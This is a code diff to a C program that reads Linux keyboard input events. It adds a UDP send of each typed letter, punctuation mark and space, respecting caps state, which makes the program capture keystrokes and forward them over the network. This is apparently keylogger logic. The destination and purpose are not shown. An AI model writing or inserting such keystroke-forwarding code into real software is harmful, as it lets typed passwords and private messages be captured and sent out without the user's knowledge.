@@ -94,134 +94,190 @@ int main(int argc, char *argv[]){
     if (CAPS){
       switch(ie.code){
         case KEY_A:
+          udpsend("A");
           break;
         case KEY_B:
+          udpsend("B");
           break;
         case KEY_C:
+          udpsend("C");
           break;
         case KEY_D:
+          udpsend("D");
           break;
         case KEY_E:
+          udpsend("E");
           break;
         case KEY_F:
+          udpsend("F");
           break;
         case KEY_G:
+          udpsend("G");
           break;
         case KEY_H:
+          udpsend("H");
           break;
         case KEY_I:
+          udpsend("I");
           break;
         case KEY_J:
+          udpsend("J");
           break;
         case KEY_K:
+          udpsend("K");
           break;
         case KEY_L:
+          udpsend("L");
           break;
         case KEY_M:
+          udpsend("M");
           break;
         case KEY_N:
+          udpsend("N");
           break;
         case KEY_O:
+          udpsend("O");
           break;
         case KEY_P:
+          udpsend("P");
           break;
         case KEY_Q:
+          udpsend("Q");
           break;
         case KEY_R :
+          udpsend("R");
           break;
         case KEY_S :
+          udpsend("S");
           break;
         case KEY_T :
+          udpsend("T");
           break;
         case KEY_U :
+          udpsend("U");
           break;
         case KEY_V :
+          udpsend("V");
           break;
         case KEY_W :
+          udpsend("W");
           break;
         case KEY_X :
+          udpsend("X");
           break;
         case KEY_Y :
+          udpsend("Y");
           break;
         case KEY_Z:
+          udpsend("Z");
           break;
       }
     }
     else{
       switch(ie.code){
         case KEY_A:
+          udpsend("a");
           break;
         case KEY_B:
+          udpsend("b");
           break;
         case KEY_C:
+          udpsend("c");
           break;
         case KEY_D:
+          udpsend("d");
           break;
         case KEY_E:
+          udpsend("e");
           break;
         case KEY_F:
+          udpsend("f");
           break;
         case KEY_G:
+          udpsend("g");
           break;
         case KEY_H:
+          udpsend("h");
           break;
         case KEY_I:
+          udpsend("i");
           break;
         case KEY_J:
+          udpsend("j");
           break;
         case KEY_K:
+          udpsend("k");
           break;
         case KEY_L:
+          udpsend("l");
           break;
         case KEY_M:
+          udpsend("m");
           break;
         case KEY_N:
+          udpsend("n");
           break;
         case KEY_O:
+          udpsend("o");
           break;
         case KEY_P:
+          udpsend("p");
           break;
         case KEY_Q:
+          udpsend("q");
           break;
         case KEY_R :
+          udpsend("r");
           break;
         case KEY_S :
+          udpsend("s");
           break;
         case KEY_T :
+          udpsend("t");
           break;
         case KEY_U :
+          udpsend("u");
           break;
         case KEY_V :
+          udpsend("v");
           break;
         case KEY_W :
+          udpsend("w");
           break;
         case KEY_X :
+          udpsend("x");
           break;
         case KEY_Y :
+          udpsend("y");
           break;
         case KEY_Z:
+          udpsend("z");
           break;
       }
     }
 
     switch (ie.code) {
       case KEY_SEMICOLON:
+        udpsend(";");
         break;
       case KEY_COMMA:
+        udpsend(",");
         break;
       case KEY_DOT:
+        udpsend(".");
         break;
       case KEY_SLASH:
+        udpsend("/");
         break;
       case KEY_BACKSLASH:
+        udpsend("\\");
         break;
       case KEY_SPACE:
+        udpsend(" ");
         break;
       default:
         printf("UNKNOWN\n");
       }
-    printf("%d\n",CAPS);
-
   }
 }
 
